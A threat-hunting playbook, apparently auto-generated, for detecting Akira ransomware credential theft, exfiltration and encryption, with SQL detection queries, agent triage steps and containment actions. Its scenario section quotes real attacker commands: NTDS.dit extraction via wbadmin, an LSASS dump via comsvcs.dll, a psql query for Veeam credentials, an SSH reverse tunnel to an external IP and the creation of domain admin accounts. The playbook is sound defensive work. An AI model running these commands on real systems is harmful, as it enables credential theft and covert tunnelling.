---
analysis: A simple rule for wbadmin may miss variation; this hunt correlates software
  inventory with rare commands across several surfaces and uses an agent to weigh
  the entire chain of events.
blind_spots:
- id: missing-endpoint-telemetry
  question: Are unmanaged servers undergoing encryption?
  requires: Endpoint telemetry from all managed and unmanaged assets
  risk: A ransomware payload executing on a server without an agent is invisible until
    system failure.
  stage: impact-akira-ransomware
- id: lsass-protection-blindness
  question: Was the LSASS dump attempt successful or blocked by security software?
  requires: hb_process_activity with error codes or OS signals
  risk: We see the command but cannot confirm if the attacker actually obtained credentials
    without seeing the resulting dump file.
  stage: credential-access-postgre-lsass
coverage:
- stage: credential-access-ntds-dump
  status: covered
  steps:
  - wbadmin-ntds-extraction
- stage: credential-access-postgre-lsass
  status: covered
  steps:
  - rare-credential-theft-commands
- stage: exfiltration-sftp
  status: covered
  steps:
  - exfiltration-connections
- stage: impact-akira-ransomware
  status: covered
  steps:
  - ransomware-payload-execution
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: initial-access-seo-poisoning
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: execution-malware-loading
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: command-and-control-bumblebee-adaptix
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: discovery-host-and-domain
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: persistence-domain-account-creation
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: lateral-movement-rdp
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: persistence-and-tunneling
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Akira ransomware results in catastrophic operational disruption.
    Detecting the precursor credential theft and exfiltration is the last line of
    defense before encryption.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has escalated privileges through NTDS dumping and database
  credential harvesting, and is now exfiltrating data before deploying Akira ransomware.
labels:
- hunt
- attack.t1003.003
- attack.t1003.001
- attack.t1555
- attack.t1048.003
- attack.t1486
name: Akira Ransomware Deployment and Credential Access
parameters:
  akira_hashes:
    default:
    - de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
    - 18b8e6762afd29a09becae283083c74a19fc09db1f2c3412c42f1b0178bc122a
    description: Hashes for Akira ransomware payloads (locker.exe, win.exe).
    from:
      kind: article
      observed: '2025-08-05'
      ref: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
    type: list[hash]
  exfil_ips:
    default:
    - 185.174.100.203
    - 193.242.184.150
    - 83.229.17.60
    description: Known exfiltration and proxy tunnel servers.
    from:
      kind: article
      observed: '2025-08-05'
      ref: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: Optional list of hostnames to scope the hunt.
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Prioritize Domain Controllers for the wbadmin check and backup servers
  (Veeam/Postgres) for the database credential check.
references:
- name: 'From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira'
  url: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
related:
- hunt: akira-initial-access-and-bumblebee
  reason: This hunt picks up where initial access and Bumblebee deployment end.
  relation: follows
- hunt: bumblebee-recon-privileged-persistence
  relation: follows
scenario:
  stages:
  - name: Initial Access via SEO Poisoning
    observables:
    - opmanager.pro
    - ManageEngine-OpManager.msi
    - angryipscanner.org
    - axiscamerastation.org
    - ip-scanner.org
    slug: initial-access-seo-poisoning
    tactic: initial-access
    techniques:
    - T1189
  - name: Bumblebee Loading and Execution
    observables:
    - msiexec.exe
    - consent.exe
    - msimg32.dll
    - 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da
    - a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
    slug: execution-malware-loading
    tactic: execution
    techniques:
    - T1574.002
    - T1204.002
  - name: Bumblebee and Adaptix C2
    observables:
    - 109.205.195.211
    - 188.40.187.145
    - 172.96.137.160
    - ev2sirbd269o5j.org
    - 2rxyt9urhq0bgj.org
    - AdgNsy.exe
    slug: command-and-control-bumblebee-adaptix
    tactic: command-and-control
    techniques:
    - T1071.001
    - T1568.002
  - name: Host and Domain Reconnaissance
    observables:
    - systeminfo
    - 'nltest /dclist:'
    - whoami /groups
    - net group "domain admins" /dom
    slug: discovery-host-and-domain
    tactic: discovery
    techniques:
    - T1082
    - T1087.002
    - T1069.002
  - name: Privileged Account Creation
    observables:
    - net user backup_DA
    - net user backup_EA
    - net group "Enterprise Administrators" backup_EA /add
    slug: persistence-domain-account-creation
    tactic: persistence
    techniques:
    - T1136.002
  - name: Lateral Movement via RDP
    observables:
    - backup_EA
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  - name: NTDS.dit Extraction
    observables:
    - wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:"C:\windows\NTDS\ntds.dit"
    - ntds.dit
    slug: credential-access-ntds-dump
    tactic: credential-access
    techniques:
    - T1003.003
  - name: Persistence and External Tunneling
    observables:
    - RustDesk
    - ssh root@193.242.184.150 -R *:10400
    - 83.229.17.60
    slug: persistence-and-tunneling
    tactic: persistence
    techniques:
    - T1133
    - T1572
  - name: Database and Memory Credential Theft
    observables:
    - psql.exe -U postgres -d VeeamBackup -c "SELECT user_name,password FROM credentials"
    - 'rundll32.exe C:\windows\System32\comsvcs.dll, #+000024'
    slug: credential-access-postgre-lsass
    tactic: credential-access
    techniques:
    - T1003.001
    - T1555
  - name: Data Exfiltration via FileZilla
    observables:
    - FileZilla
    - 185.174.100.203
    slug: exfiltration-sftp
    tactic: exfiltration
    techniques:
    - T1048.003
  - name: Akira Ransomware Deployment
    observables:
    - locker.exe
    - win.exe
    - de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
    slug: impact-akira-ransomware
    tactic: impact
    techniques:
    - T1486
  summary: Threat actors utilized SEO poisoning for 'ManageEngine OpManager' to deliver
    Bumblebee malware, which dropped AdaptixC2 for post-exploitation. The intrusion
    involved domain account creation, NTDS.dit dumping via wbadmin, and lateral movement
    to a backup server before exfiltrating data and deploying Akira ransomware.
series:
  index: 3
  slug: flash-alert-from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira
  title: 'Flash Alert: From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver
    Akira'
  total: 3
severity: critical
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Akira Ransomware Deployment and Credential Access

This hunt focuses on the final and most destructive stages of the Akira ransomware lifecycle. It identifies high-value assets like Domain Controllers and backup servers, then searches for credential extraction from the NTDS.dit file and Veeam databases. The hunt then follows the intrusion into data exfiltration via SFTP and the multi-host deployment of the Akira ransomware payload. An agent correlates early-stage credential theft with late-stage encryption to confirm the full intrusion chain.

## identify-high-value-assets
<!-- Identify High-Value Assets -->
Locate Domain Controllers and systems running backup or database software likely to be targeted for credentials.

```sqlite target=endpoint role=scoping params=(scope_hosts=scope_hosts)
~~~yaml
expected: A list of servers that represent high-value targets for an adversary. Silence
  indicates these software packages are not installed via a tracked manager.
reads:
- device_hostname
- package_name
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, package_name, vendor_name FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%veeam%' OR LOWER(package_name) LIKE '%postgres%' OR LOWER(package_name) LIKE '%sql%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## parallel-credential-harvesting
<!-- Parallel Credential Harvesting -->
parallel:
- → wbadmin-ntds-extraction
- → rare-credential-theft-commands
join: → early-credential-agent

## wbadmin-ntds-extraction
<!-- wbadmin NTDS Extraction -->
Detect use of the wbadmin backup utility to export the Active Directory database.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: A wbadmin process with a command line including ntds.dit. This is a high-confidence
  signal for domain controller compromise.
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE LOWER(process_name) LIKE '%wbadmin.exe' AND LOWER(process_cmd_line) LIKE '%ntds.dit%' AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## rare-credential-theft-commands
<!-- Rare Credential Theft Commands -->
Find rare commands targeting LSASS memory or Veeam credentials across the fleet.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Command lines that appear on very few hosts. Fleet-wide normal activity
  is excluded by the count threshold.
prevalence:
  by: device_hostname
  key:
  - process_cmd_line
  rare_below: 3
reads:
- process_cmd_line
- device_hostname
- time
- process_name
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT process_cmd_line, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%comsvcs.dll%' OR (LOWER(process_name) LIKE '%psql.exe' AND LOWER(process_cmd_line) LIKE '%credentials%')) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_cmd_line HAVING host_count <= 2
```

## early-credential-agent
<!-- Early Credential Triage -->
```agent target=hunter
cite: required
context:
- wbadmin-ntds-extraction
- rare-credential-theft-commands
max_iterations: 3
objective: Determine if any host has successfully executed credential extraction commands
  against NTDS or databases.
success_criteria: A per-host verdict of malicious | suspicious | benign citing the
  command and target file.
tools:
- endpoint
- network
```

## parallel-follow-on-impact
<!-- Parallel Follow-on Impact -->
parallel:
- → exfiltration-connections
- → ransomware-payload-execution
join: → final-intrusion-agent

## exfiltration-connections
<!-- Exfiltration Connections -->
Detect network connections to known exfiltration servers or proxy tunnels.

```sqlite target=network role=enrichment params=(exfil_ips=exfil_ips, lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Outbound connections to specified IPs. High traffic bytes from FileZilla
  or SSH processes are indicators of exfiltration.
reads:
- device_hostname
- process_name
- dst_endpoint_ip
- dst_endpoint_port
- traffic_bytes
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, dst_endpoint_ip, dst_endpoint_port, traffic_bytes, time FROM hb_network_connection WHERE instr(',' || '{{exfil_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## ransomware-payload-execution
<!-- Ransomware Payload Execution -->
Identify the execution of Akira ransomware payloads by file name or reported hash.

```sqlite target=endpoint role=triage params=(akira_hashes=akira_hashes, lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: A process match for Akira. Any result is an immediate indication of system
  encryption.
reads:
- device_hostname
- process_name
- process_hash_sha256
- process_cmd_line
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, process_hash_sha256, process_cmd_line, time FROM hb_process_activity WHERE (instr(',' || '{{akira_hashes}}' || ',', ',' || process_hash_sha256 || ',') > 0 OR LOWER(process_name) LIKE '%locker.exe' OR LOWER(process_name) LIKE '%win.exe') AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## final-intrusion-agent
<!-- Final Intrusion Assessment -->
```agent target=hunter
cite: required
context:
- early-credential-agent
- exfiltration-connections
- ransomware-payload-execution
max_iterations: 5
objective: Determine if the combined evidence proves a complete ransomware intrusion
  from credential theft to file encryption.
success_criteria: A detailed timeline of the breach, listing compromised hosts and
  the source of truth for each stage.
tools:
- endpoint
- network
```

## route-on-verdict
<!-- Route on Verdict -->
if~: "the final assessment confirms malicious activity on at least one host" (confidence: high, judge=hunter)
then: → contain-affected-hosts
indeterminate: → analyst-manual-review
unavailable: → analyst-manual-review (blind_spot: missing-endpoint-telemetry)
else: → close-out

## contain-affected-hosts
<!-- Contain Affected Hosts -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate every host identified as malicious or suspicious by the agent triage. Revoke all domain administrator credentials created or accessed during the lookback window.
```
→ analyst-manual-review

## analyst-manual-review
<!-- Analyst Manual Review -->
```manual target=analyst
Review the cited telemetry. Confirm the locker.exe execution and the wbadmin command syntax. Check for evidence of data staging in C:\ProgramData before exfiltration occurred. Initiate a restoration process from offline backups for encrypted systems.
```
→ close-out

## close-out
<!-- Close Out -->
```manual target=analyst
Record the hunt results. If the wbadmin query identified a verified intrusion, promote it to a standing detection rule. Document any unmanaged servers that were encrypted.
```
→ end
